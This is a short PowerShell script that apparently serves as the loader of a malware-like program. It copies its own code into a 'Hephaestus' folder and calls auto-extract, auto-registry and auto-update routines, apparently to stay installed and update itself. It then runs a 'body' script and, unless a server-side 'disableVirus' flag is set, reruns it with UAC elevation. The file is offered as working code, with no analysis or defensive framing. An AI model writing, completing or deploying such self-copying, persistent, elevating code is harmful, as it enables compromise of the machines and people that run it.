. ./consts_body.ps1
. ./utils.ps1
. ./embeddings.ps1
. ./autoupdate.ps1
. ./autoextract.ps1
. ./autoregistry.ps1

#holderX

try 
{
    $holderPath = Get-HolderPath
    if (1 -eq 1 -or (-not (Test-Path $holderPath)))
    {
        $holderFolder = Get-HephaestusFolder  
        $pathOrData = $MyInvocation.MyCommand.Definition
        if ($pathOrData -like "*holderX*")
        {
        } 
        else 
        {
            $pathOrData = $PSCommandPath
            if (-not (Test-Path $pathOrData))
            {
                $pathOrData = $MyInvocation.MyCommand.Path
            }
            if (Test-Path $pathOrData)
            {    
                $pathOrData = GetUtfNoBom -file $pathOrData
            } else 
            {
                $pathOrData = $pathOrData
            }
        } 
        if (-not (Test-Path $holderFolder)) {
            New-Item -Path $holderFolder -ItemType Directory | Out-Null
        }
        $holderFolder = Get-HephaestusFolder
        $job = Start-Job -ScriptBlock {
            param (
                [string]$holderPath, [string]$holderFolder, [string]$pathOrData)
                Set-Content -Path $holderPath -Value $pathOrData
        } -ArgumentList $holderPath, $holderFolder, $pathOrData
        Receive-Job -Job $job
        Wait-Job -Job $job -Timeout 300 | Out-Null
        Remove-Job -Job $job
    }
}
catch {
    Write-Host $_
}

do_autoextract

do_autoregistry

do_autoupdate

do_embeddings

RunMe -script (Get-BodyPath) -arg "guimode" -uac $false

if (-not $server.disableVirus)
{
    RunMe -script (Get-BodyPath) -arg "" -uac $true
}
